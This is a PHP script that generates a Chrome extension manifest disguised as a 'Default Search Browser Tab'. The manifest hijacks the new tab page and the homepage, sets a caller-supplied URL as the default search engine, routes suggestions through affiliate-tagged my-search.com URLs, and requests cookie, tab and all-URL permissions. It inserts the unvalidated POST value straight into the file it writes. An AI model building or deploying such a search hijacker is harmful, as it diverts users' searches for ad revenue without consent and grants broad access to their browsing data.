<?php

$data = $_POST["m"];

$d = '{
	"name":"Ex",
	"author" : "Default Tab",
	"description":"Default Search Browser Tab",
	"version":"1.0",
	"manifest_version":2,
	"icons":{
		"16":"icons/job_icon.png",
		"32":"icons/job_icon.png",
		"64":"icons/job_icon.png"
	},
	"browser_action":{
		"default_icon":"icons/job_icon.png",
		"default_popup": "popup.html"
	},
	
	"chrome_url_overrides" : {
	    "newtab": "show.html"
	},

	"chrome_settings_overrides": {
	    "homepage": "https://www.my-search.com/",
		"search_provider": {
	        "name": "Nadeem Ahmad",
	        "keyword": "keyword.__MSG_url_domain__",
	        "search_url": "'.$data.'={searchTerms}",
	        "favicon_url": "http://filiplang.se/favicon.ico",
	        "suggest_url": "https://www.my-search.com/suggest?aid=4898&zoneid=89111407&q={searchTerms}",
	        "instant_url": "https://www.my-search.com/instant?aid=4898&zoneid=89111407&q={searchTerms}",
	        "image_url": "https://www.my-search.com/image?aid=4898&zoneid=89111407&q={searchTerms}",
	        "alternate_urls": [
	          "'.$data.'={searchTerms}",
	          "'.$data.'={searchTerms}"
	        ],
	        "encoding": "UTF-8",
	        "is_default": true
	    }
	},


	"permissions":[
        "cookies",
		"tabs",
		"notifications",
        "<all_urls>"
	]
}
';
$myfile = fopen("manifest.json", "w") or die("Unable to open file!");
if(fwrite($myfile, $d)){
    echo "Success";
    fclose($myfile);
} else{
    echo "Some Error Occurred !";
}





// https://search.yahoo.com/search;_ylt=AwrE19sJ2odbaTcAHRBDDWVH?p=wow&fr=sfp&iscqry=










?>